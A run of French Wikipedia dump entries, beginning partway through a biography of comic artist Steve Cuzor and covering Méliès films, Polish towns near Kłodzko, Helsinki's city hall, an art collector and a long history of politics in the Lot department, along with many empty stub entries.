Steve Cuzor grandit à Montargis et étudie les arts appliqués à Paris. Il mène une carrière de cow-boy de rodéo sur les bases militaires en Allemagne et il vit au Texas de 1992 à 1994.
Il dessine "Le Ventre des Ténèbres" (1996), sur un scénario de Brice Tarvel, premier volume d'une série intitulée "Les mangeurs de foudre" qui ne connaît pas de suite. À partir de 1999, Casterman publie "Blackjack", dont Cuzor assure scénario, dessin et couleurs qui connaît quatre tomes. Il participe à la série collective "BD Blues" des Éditions Nocturne en signant le dessin d'un album scénarisé par José-Louis Bocquet : "Lead Belly" (2006). La même année, pour Dupuis, il dessine avec Giulio De Vita "L'Histoire d'Élias Cohen", dans la série "Quintett" scénarisée par Frank Giroud. À partir de 2009, pour les éditions Dargaud, Cuzor entreprend avec Philippe Thirault puis Stéphane Colman la trilogie "O'boys", achevée en 2012 ; le récit narre et reflète l'intérêt de Cuzor pour le blues. Il s'associe à Laurent-Frédéric Bollée (scénario) pour dessiner "Billy Stockton", album de la série "XIII Mystery" (2013). Avec Yves Sente au scénario, Cuzor livre en 2018 "Cinq branches de coton noir", bande dessinée historique sur le premier drapeau des États-Unis et sur la lutte des Afro-Américains contre le racisme. L'œuvre remporte le prix Coup de cœur au festival Quai des Bulles ainsi que le prix Diagonale du meilleur album.

</doc>
<doc id="6807118" url="https://fr.wikipedia.org/wiki?curid=6807118" title="Les Quatre Cents Farces du diable">
Les Quatre Cents Farces du diable

Les Quatre Cents Farces du diable est un film réalisé par Georges Méliès, sorti en 1906.
Synopsis.
L’ingénieur anglais William Crackford, amateur de records de vitesse, vend son âme à l’alchimiste Alcofrisbas – qui n’est autre que Satan – en échange de pilules magiques qui lui permettent de voyager selon ses désirs. Après une chevauchée céleste en compagnie de son valet John, avec un cheval apocalyptique et une voiture astrale, Crackford, entraîné aux enfers par Satan, finit sur un tourne-broche.

</doc>
<doc id="6807120" url="https://fr.wikipedia.org/wiki?curid=6807120" title="Les 400 farces du diable">
Les 400 farces du diable



</doc>
<doc id="6807121" url="https://fr.wikipedia.org/wiki?curid=6807121" title="Hyōbanki">
Hyōbanki

Les sont des compilations de classements et critiques d'acteurs et courtisanes kabuki publiées à l'époque d'Edo du Japon. Généralement publiés au Nouvel An à Edo et Kamigata, ils passent en revue et classent les courtisanes et acteurs de l'année précédente. Avec les impressions sur bois "ukiyo-e" et d'autres publications, les "hyōbanki" sont d'importants éléments de la culture citadine de cette période.
Acteur "hyōbanki".
Un livre appelé "Yarō hyōbanki" est publié en 1656, bien que de nombreux spécialistes considèrent le "Yakusha hyōbanki" de 1687 comme le premier du genre. Ces compilations sont publiées régulièrement jusqu'en 1890.
Les acteurs sont classés selon une échelle assez simple :
Dans la presse écrite, des variations sont utilisées pour représenter les rangs intermédiaires entre "jō-jō" et "jō-jō-kichi". Parfois, seules les parties du kanji (caractère) pour sont écrites dans chaque coup (de pinceau) vers l'achèvement du personnage pour représenter un rang intermédiaire. D'autres fois, seuls les contours (des coups) sont dessinés au lieu de traits pleins, pour représenter les classements intermédiaires non encore atteints.
À certains moments, des rangs au-dessus de "jō-jō-kichi" sont ajoutés, pour décrire et classer les plus grands acteurs de kabuki.

</doc>
<doc id="6807124" url="https://fr.wikipedia.org/wiki?curid=6807124" title="Le Rastaquouère Rodriguez y Papanagaz">
Le Rastaquouère Rodriguez y Papanagaz



</doc>
<doc id="6807126" url="https://fr.wikipedia.org/wiki?curid=6807126" title="Une chute de cinq étages">
Une chute de cinq étages

Une chute de cinq étages est un film muet de Georges Méliès sorti en 1906.
Synopsis.
Un couple de jeunes mariés vient chez un photographe se faire tirer le portrait. À la suite d'un incident, l’appareil photo tombe des cinq étages de l’immeuble et s’écrase sur un passant. S’ensuit une véritable corrida où le passant est pris pour un taureau.

</doc>
<doc id="6807127" url="https://fr.wikipedia.org/wiki?curid=6807127" title="Paul Van Damme (1929-1995)">
Paul Van Damme (1929-1995)



</doc>
<doc id="6807131" url="https://fr.wikipedia.org/wiki?curid=6807131" title="François Bonaventure Arago">
François Bonaventure Arago

François Bonaventure Arago (né le à Estagel, mort le à Perpignan) est un homme politique français. Il est également le père des « frères Arago ».
Biographie.
Famille.
Issu d'une famille de propriétaires terriens aisés, mais orphelin dès l'âge d'un an, François Arago est élevé par son oncle. En 1774, il devient bachelier de droit de l'Université de Perpignan. Le , il épouse Marie Roig, de qui il aura onze enfants : cinq filles (dont trois meurent en bas âge) et six fils :
Carrière politique.
Ayant bénéficié d'une éducation universitaire, il s'implique très tôt dans l'administration municipale d'Estagel, devenant régisseur des moulins de la communauté en 1781, premier consul en 1786, puis receveur de la commune en 1787.
Partisan des idées nouvelles, il fait partie des notables qui après 1789, rallient la Révolution française. Il devient ainsi maire d'Estagel (1790), juge de paix du canton d'Estagel, membre du Conseil départemental puis du Directoire départemental (1791), commandant de la Garde nationale pendant la Guerre franco-espagnole de 1793, président du Directoire départemental (1794) puis, de 1797 à sa mort, caissier de l'Atelier des monnaies de Perpignan.

</doc>
<doc id="6807134" url="https://fr.wikipedia.org/wiki?curid=6807134" title="Bystrzyca Kłodzka">
Bystrzyca Kłodzka

Bystrzyca Kłodzka (en ; en ) est une ville polonaise du powiat de Kłodzko, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la commune ("gmina") de Bystrzyca Kłodzka.
Géographie.
La ville se situe sur la rive gauche de la Neisse de Glatz ("Nysa Kłodzka") dans une cuvette au milieu des Sudètes. Bystrzyca Kłodzka se trouve à environ 20 kilomètres au sud de Kłodzko.
Histoire.
Fondée au cours de la colonisation germanique dans la deuxième moitié du , la ville se développa à côté d'un village slave ("Bystřice"). À ce temps, le domaine faisait partie des biens du seigneur Havel de Lemberk, mari de Zdislava canonisée en 1995. Le roi Jean de Bohême a conféré à "Hawelswerd" le statut de ville royal, un privilège confirmé par son fils l'empereur Charles IV en 1348.
Dès sa fondation, le lieu a bénéficié d'une situation favorable sur la route commerciale de Wrocław (Vratislavie) en Silésie par les Sudètes à Brno en Moravie. De nombreux artisans, notamment des tisserands s'établissaient dans la ville ; un moulin à foulon est documenté en 1319.
Dévastés durant les croisades contre les hussites dans les années 1420, les domaines dans la cuvette de Kłodzko ("Glatz") ont été acquis par Georges de Poděbrady, élu roi de Bohême en 1458. L'année suivante, il a créé le comté de Glatz en apanage pour son fils cadet Victor, confirmé par l'empereur Frédéric III. En 1469 Habelschwerdt a été pillée par des troupes silésiennes, alliées du roi hongrois Matthias Corvin.
Dès 1526, les pays de la couronne de Bohême font partie de la monarchie de Habsbourg. Au cours de la Réforme protestante, les citoyens se tournèrent tout d'abord vers les mouvements radicaux de Caspar Schwenckfeld et de l'anabaptisme ; plus tard, depuis le début des persécutions au milieu du , ils accueillaient le luthéranisme. Pendant la guerre de Trente Ans, la population est soumise aux mesures de la Contre-Réforme.
Après la première guerre de Silésie, en 1742, le comté de Glatz, conjointement avec la Basse-Silésie au nord, fut annexé par le royaume de Prusse sous Frédéric le Grand. Dans la seconde guerre de Silésie (1744-1745), la ville est à nouveau pillée par les troupes hongroises et les pandoures de Franz de Trenck. Au cours de la guerre de succession de Bavière (1778-1779), Habelschwerdt subit d'importants dégâts matériels par des tirs de mortier lors de l'attaque surprise menée le par les Autrichiens contre les deux bataillons du régiment von Luck dont l'un est stationné à l'intérieur de la muraille de la ville, l'autre dans les faubourgs. 
Après le congrès de Vienne en 1815, Habelschwerdt est le chef-lieu de l'arrondissement d'Habelschwerdt dans le district de Reichenbach puis (en 1820) dans le district de Breslau au sein de la Silésie prussienne.
En 1945, vers la fin de la Seconde Guerre mondiale, la ville fut conquise par l'Armée rouge. L'établissement de la frontière germano-polonaise sur la ligne Oder-Neisse l'intègre à la république de Pologne. La population germanophone restante était expulsée. De 1975 à 1998, la ville se trouve dans la voïvodie de Wałbrzych.
Jumelages.
La ville de Bystrzyca Kłodzka est jumelée avec :

</doc>
<doc id="6807136" url="https://fr.wikipedia.org/wiki?curid=6807136" title="Szczytna">
Szczytna

Szczytna est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Szczytna, dans le powiat de Kłodzko.

</doc>
<doc id="6807141" url="https://fr.wikipedia.org/wiki?curid=6807141" title="Port de l'Houmeau">
Port de l'Houmeau



</doc>
<doc id="6807143" url="https://fr.wikipedia.org/wiki?curid=6807143" title="Lądek-Zdrój">
Lądek-Zdrój

Lądek-Zdrój est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Plus ancienne ville d'eau de Basse-Silésie, elle est le chef-lieu de la gmina de Lądek-Zdrój, dans le powiat de Kłodzko.
Histoire.
De 1818 à 1945, Bad Landeck fait partie de l'arrondissement d'Habelschwerdt dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="6807144" url="https://fr.wikipedia.org/wiki?curid=6807144" title="Marie Roig">
Marie Roig



</doc>
<doc id="6807147" url="https://fr.wikipedia.org/wiki?curid=6807147" title="Międzylesie">
Międzylesie

Międzylesie (en allemand "Mittelwalde") est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Międzylesie, dans le powiat de Kłodzko.
Histoire.
De 1818 à 1945, Mittelwalde fait partie de l'arrondissement d'Habelschwerdt dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="6807149" url="https://fr.wikipedia.org/wiki?curid=6807149" title="Hôtel de ville d'Helsinki">
Hôtel de ville d'Helsinki

L'hôtel de ville d’Helsinki (en ) est un bâtiment construit dans le quartier de Kruununhaka à Helsinki en Finlande.
Description.
La mairie est située au 11-13, Pohjoisesplanadi au bord de la place du Marché d'Helsinki dans le quartier de Kruununhaka. 
Le bâtiment abrite les bureaux du maire d'Helsinki et de ses adjoints ainsi que des salles de réunion pour le conseil municipal d'Helsinki "(Helsingin kaupunginvaltuusto)" et du Bureau exécutif "(Helsingin kaupunginhallitus)".
Le bâtiment conçu par l'architecte Carl Ludvig Engel est terminé en 1833. Il est l'un des bâtiments du centre historique de style Empire. 
L'utilisateur d'origine du bâtiment était l'hôtel Seurahuone et il sert de mairie depuis 1913. 
Les espaces intérieurs ont été radicalement rénovés dans les années 1960 selon les plans de l'architecte Aarno Ruusuvuori.

</doc>
<doc id="6807150" url="https://fr.wikipedia.org/wiki?curid=6807150" title="Charles Deudon">
Charles Deudon

Charles Deudon est un collectionneur d'art français né au Cateau-Cambrésis le et mort à Nice le .
Biographie.
Charles Deudon est l'héritier d'une fortune minière britannique grâce au mariage de son père Charles Antoine Deudon avec Elizabeth Emma Sheldon (1796-1862).
Il acquiert le 17 mai 1878 "La Danseuse" de Auguste Renoir au galeriste Durand-Ruel, tableau actuellement exposé à Washington, National Gallery of Art. Il est proche de Édouard Manet à qui il achète "La Prune" et de Charles Ephrussi. Il fréquente Henri Cernuschi, Théodore Duret ainsi que quelques salons littéraires parisiens ou il se lie d'amitié avec Paul Bourget. Sa collection est uniquement constituée de tableaux impressionnistes, parmi lesquels "Port-Marly" d'Alfred Sisley acquis par Paul Rosenberg à la mort de Deudon, non localisé. Il entretient une correspondance avec les peintres impressionnistes de son entourage : Auguste Renoir ou Claude Monet.

</doc>
<doc id="6807151" url="https://fr.wikipedia.org/wiki?curid=6807151" title="Communauté de communes du Florentinois">
Communauté de communes du Florentinois

La communauté de communes du Florentinois est une ancienne communauté de communes française, située dans le département de l'Yonne en région Bourgogne-Franche-Comté.
En 2017, elle fusionne avec la Communauté de communes de Seignelay - Brienon pour former la Communauté de communes Serein et Armance.
Histoire.
La communauté de communes du Florentinois a été créée le , succédant à l'ancienne communauté de communes du même nom.
Elle est le résultat de la fusion de cette ancienne intercommunalité avec une partie de celle d'Othe en Armançon (8 communes) ainsi que la commune de Chailley, jusqu'alors « isolée » (ne faisant partie d'aucun ÉPCI).
Politique et administration.
Le siège de la communauté de communes est situé à Saint-Florentin.
Conseil communautaire.
La communauté de communes du Florentinois est gérée par un conseil communautaire composé de 32 délégués issus de chacune des communes membres et élus pour une durée de six ans, coïncidant ainsi avec les échéances des scrutins municipaux.
Ils sont répartis comme suit :
Lors des trois mois séparant la création de la communauté de communes des élections municipales de 2014, la transition est assurée par les délégués communautaires des anciennes communautés de communes.
Présidence.
Le conseil communautaire élit un président pour une durée de six ans. La présidence, pendant la période entre la création de l'intercommunalité et la désignation des nouveaux délégués communautaires, est assurée par Maxence Guillot, présidente de l'ancienne communauté de communes du Florentinois, qui est la plus importante des anciennes communautés de communes en nombre d'habitants. Après les échéances municipales, le , c'est Yves Delot, maire de Saint-Florentin, qui lui succède.
L'ancienne communauté de communes du Florentinois.
Histoire.
La communauté de communes du Florentinois a été créée par arrêté préfectoral du , qui a pris effet le .
En date du , la communauté de communes fusionne avec une partie de celle d'Othe en Armançon (8 communes) ainsi que la commune de Chailley, jusqu'alors « isolée » (ne faisant partie d'aucun ÉPCI), au sein de l'actuelle communauté de communes du Florentinois.
Composition.
Elle était composée des six communes suivantes :
Compétences.
L'intercommunalité est compétente pour :

</doc>
<doc id="6807153" url="https://fr.wikipedia.org/wiki?curid=6807153" title="Politique de l'Ain">
Politique de l'Ain



</doc>
<doc id="6807156" url="https://fr.wikipedia.org/wiki?curid=6807156" title="Mairie d’Helsinki">
Mairie d’Helsinki



</doc>
<doc id="6807157" url="https://fr.wikipedia.org/wiki?curid=6807157" title="Politique des Alpes-de-Haute-Provence">
Politique des Alpes-de-Haute-Provence



</doc>
<doc id="6807159" url="https://fr.wikipedia.org/wiki?curid=6807159" title="Politique des Alpes-Maritimes">
Politique des Alpes-Maritimes



</doc>
<doc id="6807161" url="https://fr.wikipedia.org/wiki?curid=6807161" title="Radków (Basse-Silésie)">
Radków (Basse-Silésie)

Radków (en ) est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la "gmina" de Radków, dans le powiat de Kłodzko.
Histoire.
Après la réorganisation de la Prusse, Wünschelburg fait partie à partir de 1815 de la province de Silésie, qui est divisée en arrondissements. De 1816 à 1853, la ville est rattachée à l'arrondissement de Glatz et de 1854 à 1932 à l'arrondissement de Neurode.

</doc>
<doc id="6807163" url="https://fr.wikipedia.org/wiki?curid=6807163" title="Politique de l'Aveyron">
Politique de l'Aveyron



</doc>
<doc id="6807165" url="https://fr.wikipedia.org/wiki?curid=6807165" title="Politique des Bouches-du-Rhône">
Politique des Bouches-du-Rhône



</doc>
<doc id="6807166" url="https://fr.wikipedia.org/wiki?curid=6807166" title="Politique de la Charente">
Politique de la Charente



</doc>
<doc id="6807168" url="https://fr.wikipedia.org/wiki?curid=6807168" title="Stronie Śląskie">
Stronie Śląskie

Stronie Śląskie est une ville de Pologne, située dans le sud-ouest du pays, dans la voïvodie de Basse-Silésie. Elle est le chef-lieu de la gmina de Stronie Śląskie, dans le powiat de Kłodzko.
Histoire.
De 1818 à 1945, Seitenberg fait partie de l'arrondissement d'Habelschwerdt dans le district de Breslau au sein de la province de Silésie.

</doc>
<doc id="6807169" url="https://fr.wikipedia.org/wiki?curid=6807169" title="Politique de la Charente-Maritime">
Politique de la Charente-Maritime



</doc>
<doc id="6807174" url="https://fr.wikipedia.org/wiki?curid=6807174" title="Politique du Finistère">
Politique du Finistère



</doc>
<doc id="6807176" url="https://fr.wikipedia.org/wiki?curid=6807176" title="Politique du Gard">
Politique du Gard



</doc>
<doc id="6807179" url="https://fr.wikipedia.org/wiki?curid=6807179" title="Politique dans le Lot">
Politique dans le Lot

Cet article donne une vision synthétique de la politique dans le Lot.
Le conseil départemental du Lot et la préfecture se trouvent à Cahors.
Histoire politique et rapports de force.
De 1958 à 1967.
La vie politique lotoise fut marquée par la forte domination de deux hommes Maurice Faure et Georges Juskiewenski et l'arrivée d'un certain Georges Pompidou qui va réussir une implantation locale dans ce bastion des radicaux.
L'année 1958, marque le retour du général de Gaulle aux affaires et l'événement de la République. le Lot obtient deux sièges de députés (contre trois dans la précédente législature) à l'Assemblée nationale. Les élections de novembre furent marquées par un raz-de-marée gaulliste en France. Dans la première circonscription (Cahors-Gourdon), le maire de Prayssac et député sortant Maurice Faure (Radical) est réélu au second tour avec voix après avoir battu au premier tour l'ancien député Abel Bessac (MRP) et son suppléant un certain Bernard Pons. Dans la deuxième (Figeac-Souillac), deux députés sortants s'affrontent, le maire de Figeac et candidat de la SFIO Georges Juskiewenski et Henri Thamier qui porte les couleurs du parti communiste. Juskiewenski arrive en tête et il affrontera Thamier pour le second tour. Faisant le maximum de voix à droite et au centre ainsi que la gauche non communiste, le maire de Figeac sera réélu avec 72,28 % des voix 27,72 pour Henri Thamier.
L'année 1959, voit les municipales de mars avec quelques changements en terre lotoise. L'élection du radical Lucien Bénac à Cahors où il succède à Zacharie Lafage et l'élection du DVD Guy Murat à Cajarc dans une terre marquée par le radical-socialisme. Faure est réélu à Prayssac, Juskiewenski à Figeac, le sénateur Marc Baudru (SFIO) conserve sa mairie de Gourdon tout comme Marcel Bourrières à Montcuq. La gauche domine la majorité des municipalités du département.
En avril, les élections sénatoriales élisent le radical Gaston Monnerville qui sera élu quelques semaines plus tard Président du Sénat et il y assumera la présidence de cette Assemblée jusqu'en 1968.
L'année 1961, voit une nette victoire de la majorité gaulliste lors des cantonales de juin. Dans le Lot, élection du DVG Cassan sur le canton de Lacapelle-Marival, l'ancien sénateur Louis Garrigou (Radical) est réélu dans le Canton de Lauzès, Georges Juskiewenski (SFIO) et lui aussi réélu sur Canton de Figeac-Ouest. La droite conserve les cantons de Bretenoux avec le maire UNR de Cahus Vaquié et de Lalbenque avec la réélection du DVD Léon Enjalbert.
L'année 1962, marque la dissolution de l'Assemblée par le général à la suite du vote de défiance envers le Premier ministre Georges Pompidou. Les législatives de novembre sont une victoire pour le général et Pompidou. Dans la première circonscription du Lot, le député sortant Maurice Faure est réélu dès le premier tour avec 63,11 % comme le SFIO Georges Juskiewenski lui aussi réélu au premier tour avec 65,86 % contre Henri Thamier.
L'année 1963, voit l'élection de Maurice Faure au conseil général à la suite d'une élection partielle dans le Canton de Montcuq.Pour ce faire, Maurice Faure avait démissionné de son premier mandat de Conseiller Général du canton de Salviac ( où il avait été élu en 1957 dans une autre élection partielle à la suite du décès du docteur Cambornac )
L'année 1964, voit la forte implantation de la gauche lotoise lors des cantonales. Faure est réélu dans son canton et la gauche conserve les cantons de Gourdon avec Baudru, le Canton de Limogne-en-Quercy et prend le canton de Bretenoux ou le gaulliste Armand Vaquié est battu par le candidat de la SFIO Manoul. La droite réalise la conquête de Livernon avec le DVD Delmas et conserve le Canton de Labastide-Murat avec le centriste Faurie.
Gaston Monnerville devient maire de Saint-Céré.
L'année 1965, voit les municipales du 14 et 21 mars où Maurice Faure (Radical) réussit la succession de Lucien Bénac sur Cahors, et il sera remplacé à la mairie de Prayssac par Andrée Faure. Georges Juskiewenski est réélu pour un nouveau mandat à Figeac, comme Baudru à Gourdon, Monnerville à Saint-Céré ou encore le communiste Jaurès Chaudru à Souillac. Le DVD Guy Murat est réélu à Cajarc où il compte dans son conseil un nouveau conseiller municipal en la personne de Georges Pompidou, Premier Ministre.
En décembre, la présidentielle voit s'affronter Charles de Gaulle et François Mitterrand candidat de la gauche. De Gaulle arrive en tête dans le Lot avec 39,34 % des voix contre 36,60 % pour Mitterrand et c'est François Mitterrand qui sera vainqueur au second avec 51,13 % contre 48,87 % des voix pour le général. Mitterrand est tête à Figeac, Puy-l'Évêque, Gourdon, Le général est majoritaire de deux voix seulement à Cahors (50,01 %) et à Cajarc (55 %).
L'année 1966, marque le décès de l'ancien sénateur et conseiller général Louis Garrigou. Lors de la partielle dans le canton de Lauzès, c'est le divers droite Baldy qui sera élu.
L'année 1967 marque une sanction sévère pour la gauche dans le département lors des législatives du 5 et 12 mars où Maurice Faure est en ballottage défavorable face l'UDR Jean-Pierre Dannaud qui arrive en tête au premier tour avec 35,1 % face à Faure que ne recueille seulement 31,7 % et le maire de Puy-l'Évêque Ernest Marcouly (FGDS) 18,7. Au second tour, Maurice Faure sera soutenu par le FGDS et il battra Jean-Pierre Dannaud avec 48,4 % contre 43,4 % dans une triangulaire ou Marcouly refusa de se retirer et il fera 8,2 %. Dans la deuxième, c'est le candidat gaulliste Bernard Pons (ami personnel de Pompidou) qui arrive largement en tête avec 37,6 % et il réalise son meilleur score dans le canton de Cajarc (52,8 %) qui n'est d'autre que le fief de son suppléant Guy Murat. Le député sortant Georges Juskiewenski arrive en seconde position avec 27,8 suivi du communiste Thamier avec 25,7. Juskiewenski se retire et c'est Pons qui sera élu avec 54,38 % contre 45,62 % pour Henri Thamier. C'est la première fois sous la République que le Lot envoie un député de droite à l'Assemblée Nationale.
Les cantonales de septembre et octobre voient la conquête de plusieurs cantons pour l'UDR comme celui de Lauzès ou Dannaud succède à Baldy, Cajarc avec l'élection de justesse du député Bernard Pons contre le sortant Gilbert Maillebiau et Luzech avec le gaulliste André Carle.
De 1968 à 1978.
La vie politique lotoise fut marquée par la présence du gaulliste Bernard Pons futur ministre et secrétaire général du RPR.
L'année 1968, marque les événements de mai 68 ou le général de Gaulle, prend la décision de dissoudre l'Assemblée nationale. Les résultats des élections sont un plébiscite pour l'UDR et ses alliés. Dans le Lot, le radical Maurice Faure est réélu de justesse avec 50,59 % contre Jean-Pierre Dannaud (UDR) dans la première circonscription. Dans la deuxième, Bernard Pons est réélu dans une triangulaire avec 48,20 % contre le journaliste Martin Malvy (FGDS) qui obtient 38,80 % et l'ancien député Georges Juskiewenski (DVG) 13 %.
L'année 1969, marque le départ du général à la suite de son échec lors du référendum et l'élection de Georges Pompidou à l'Élysée avec 58,21 %. Dans le département du Lot ou il possède une maison à Cajarc. le candidat Pompidou arrive largement en tête avec 47,58 % lors du premier tour ou il est soutenu par le maire de Figeac et ancien député SFIO Georges Juskiewenski. Georges Pompidou sera victorieux au second tour sur les terres lotoise avec 58,76 % des voix contre 41,24 % pour Alain Poher. Pompidou est majoritaire à Cahors, Cajarc ou encore Figeac. Le , Bernard Pons fait son entrée dans le gouvernement Chaban-Delmas comme secrétaire d'état à l'Agriculture. C'est son suppléant le maire de Cajarc Guy Murat qui le remplace dans l'hémicycle.
L'année 1970, marque une victoire de la droite lors des cantonales de mars. Mais la gauche conserve la majorité au Conseil général ou Gaston Monnerville garde la présidence. La victoire de Vaquié (UDR) qui prend sa revanche sur Manoul dans le canton de Bretenoux, Gineste dans celui de Saint-Céré et le centriste Faurie obtient un nouveau mandat dans le canton de Labastide-Murat. Martin Malvy est élu dans le canton de Vayrac, Lucien Cabanès succède à l'ancien sénateur Marc Baudru dans le Canton de Gourdon.
L'année 1971, fut celle des municipales du mois de mars ou la gauche est à nouveau majoritaire avec les réélections de Faure à Cahors, Juskiewenski à Figeac, Andrée Faure à Prayssac. Élection d'André Miquel à Montcuq ou il succède à Marcel Bourrières (maire depuis 1944). les gaullistes subissent un terrible revers avec la défaite de Pons face à Jaurès Chadru (PCF) à Souillac, le député Guy Murat est battu au premier tour face au radical de gauche Guy Mirabel à Cajarc. Seule la victoire de Jean-Pierre Dannaud à Gourdon sauve la droite lotoise d'un véritable Waterloo.
Maurice Faure succède à Gaston Monnerville à la présidence du conseil général.
L'année 1973, marque les élections législatives du 4 et 11 mars ou la gauche est majoritaire en voix. Dans la première circonscription, le maire MRG de Cahors Maurice Faure est réélu sans difficultés face au maire de Lacapelle-Marival Jean-Gabriel Costes. Bernard Pons (UDR) est réélu de justesse avec 50,30 % des voix face au conseiller général et candidat du PS Martin Malvy. Seulement 265 voix d'avance pour Pons et cela poussera Malvy à demander l'annulation de l'élection au Conseil d'état, mais sa demande sera refusée. Bernard Pons quitte le gouvernement pour siéger à l'Assemblée nationale.
En septembre, se déroule les cantonales ou la droite est battu par les socialistes et les radicaux. Dannaud cède son siège de conseiller général au MRG Louis Baldy, Pons est réélu dans le canton de Cajarc, le maire de Gramat Jean Dumas est élu dans son canton, Robert Bories (UDR) fait la conquête de Figeac-Est. Faure conserver la présidence du conseil général avec Martin Malvy comme vice-président.
L'année 1974, marque le décès du Président Georges Pompidou et l'élection de son ministre des Finances Valéry Giscard d'Estaing à la Présidence de la république. Dans le Lot, François Mitterrand est vainqueur avec 53,91 % contre 46,09 pour Giscard. Mitterrand arrive en tête à Gourdon (58,26 %), Cahors (53,37 %) et Figeac (52 %). Alors que le candidat Giscard est majoritaire à Gramat et Rocamadour.
Le , marque le décès du maire de Figeac et ancien député Georges Juskiewenski à l'âge de , c'est le socialiste Bernard Fontanges qui lui succède à la mairie et Marcel Costes au conseil général.
L'année 1976, fut celle des cantonales avec la nette victoire de la gauche face à l'UDR. Dans le département du Lot, la droite subie encore un échec et l'union PS-MRG conforte aisément leur majorité. La gauche reprend les cantons de Saint-Céré ou Gineste est battu par le socialiste Bernard Martignac, Labastide-Murat ou encore Bretenoux.
L'année 1977, marque l'éclatante victoire de la gauche lors des municipales de mars ou le pays sanctionne la politique mené par le gouvernement de Raymond Barre. Dans le Lot, Maurice Faure est triomphalement réélu au premier tour à Cahors avec 65,64 % des voix, le candidat de droite Gayet obtient seulement 30,47 %, à Cajarc le MRG Guy Mirabel est lui aussi réélu. Camille Couture succède à Andrée Faure à la mairie de Prayssac, Henri Dernancourt doit céder son fauteuil de maire au PS Paul Monty-Aly à Montcuq et la gauche retrouve Gourdon avec la victoire du MRG Jean-Lucien Cabanès. À Figeac, Bernard Pons et Martin Malvy se disputent la succession de Bernard Fontages et c'est Malvy qui sortira largement vainqueur de ce duel face au député RPR. Le RPR conserve Gramat avec la réélection de Jean Dumas et réalise la conquête de Souillac avec l'élection du jeune universitaire Alain Chastagnol qui met fin à plusieurs années de gestion communiste sur cette commune.
L'année 1978 voit s'approcher les élections législatives où Bernard Pons sait que la partie est perdue dans son département et il décide de partir s'implanter dans l'Essonne. Maurice Faure est réélu au second tour avec 60,86 % contre le candidat RPR Alain Dauga. Le troisième tentative fut la bonne pour Martin Malvy qui l'emporte au second tour avec 55,44 % contre 44,56 % pour le jeune maire de Souillac Alain Chastagnol.
Représentation politique et administrative.
Préfets et arrondissements.
Le département du Lot est découpé en trois arrondissements regroupant les cantons suivants :
Depuis le redécoupage cantonal de 2014, un canton peut contenir des communes provenant de plusieurs arrondissements. Cela concerne les quatre cantons lotois suivants : Causse et Bouriane, Causse et Vallées, Gramat et Puy-l'Évêque.
Députés et circonscriptions législatives.
Depuis le découpage électoral de 1986, le département comprend deux circonscriptions regroupant les cantons suivants :
À la suite du redécoupage des cantons de 2014, les circonscriptions législatives ne sont plus composées de cantons entiers mais continuent à être définies selon les limites cantonales en vigueur en 2010. Les circonscriptions sont ainsi composées des cantons actuels suivants :
Sénateurs.
Dans le Lot, deux sièges sont à pourvoir lors du scrutin de septembre 2023, soit le même nombre qu'en 2017. À la différence de départements plus peuplés qui élisent leurs sénateurs au scrutin de liste, les grands électeurs lotois désignent leurs deux représentants à la chambre haute au scrutin majoritaire plurinominal.
Au premier tour, Jean-Marc Vayssouze-Faure est élu avec 410 voix et 63,57 % des suffrages exprimés tandis que la sénatrice sortante Angèle Préville termine en troisième position derrière le radical Raphaël Daubet. Au second tour, après le retrait des autres candidats, seuls restent deux prétendants et c'est Raphaël Daubet qui remporte le deuxième siège avec 376 voix et 58,93 %.
Conseillers régionaux.
Le conseil régional d'Occitanie compte 158 membres élus pour six ans dont 5 représentant le Lot. Dans le détail, 3 sièges ont été obtenus par la liste d'union à gauche avec des écologistes « L'Occitanie en commun » et 2 sièges par l'union de la droite (« Du courage pour l'Occitanie »).
Conseillers départementaux.
Depuis le redécoupage cantonal de 2014, le nombre de cantons est passé de 31 à 17 avec un binôme paritaire élu dans chacun d'entre eux, soit 34 conseillers départementaux. À l'issue des élections départementales de 2015, le socialiste dissident Serge Rigal est réélu à la présidence du conseil départemental par 24 voix contre 9 pour Geneviève Lagarde, candidate investie par les militants du PS.
Le juillet 2021, à la suite des élections départementales, Serge Rigal est réélu pour un troisième mandat avec 30 voix sur 34. On compte par ailleurs trois bulletins nuls et un bulletin blanc.
Le , lors de la session d'installation du conseil départemental, cinq vice-présidentes et cinq vice-présidents ont été élus.
Par ailleurs, Anne Laporterie (Figeac-2, "Socialistes et citoyens") est conseillère déléguée chargée de l'ingénierie territoriale.
Le conseil départemental du Lot compte trois groupes politiques : 

</doc>
<doc id="6807181" url="https://fr.wikipedia.org/wiki?curid=6807181" title="Politique de la Lozère">
Politique de la Lozère



</doc>
<doc id="6807183" url="https://fr.wikipedia.org/wiki?curid=6807183" title="Politique de Maine-et-Loire">
Politique de Maine-et-Loire



</doc>
<doc id="6807186" url="https://fr.wikipedia.org/wiki?curid=6807186" title="Politique de la Marne">
Politique de la Marne



</doc>
<doc id="6807190" url="https://fr.wikipedia.org/wiki?curid=6807190" title="Politique du Morbihan">
Politique du Morbihan



</doc>
<doc id="6807192" url="https://fr.wikipedia.org/wiki?curid=6807192" title="Politique de la Moselle">
Politique de la Moselle



</doc>
<doc id="6807195" url="https://fr.wikipedia.org/wiki?curid=6807195" title="Politique du Pas-de-Calais">
Politique du Pas-de-Calais



</doc>
<doc id="6807197" url="https://fr.wikipedia.org/wiki?curid=6807197" title="Politique du Puy-de-Dôme">
Politique du Puy-de-Dôme



</doc>
<doc id="6807200" url="https://fr.wikipedia.org/wiki?curid=6807200" title="Politique du Bas-Rhin">
Politique du Bas-Rhin



</doc>
<doc id="6807202" url="https://fr.wikipedia.org/wiki?curid=6807202" title="Politique dans le Rhône">
Politique dans le Rhône

